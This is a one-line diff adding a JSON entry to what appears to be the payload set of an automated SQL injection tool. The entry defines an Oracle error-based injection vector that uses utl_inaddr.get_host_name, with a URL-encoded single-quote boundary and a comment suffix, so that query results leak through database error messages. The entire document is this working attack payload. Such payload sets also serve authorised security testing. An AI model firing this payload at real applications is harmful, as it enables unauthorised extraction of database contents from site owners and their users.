@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=utl_inaddr.get_host_name(({Q}))", "comment": "oracle error: url-enc single"}
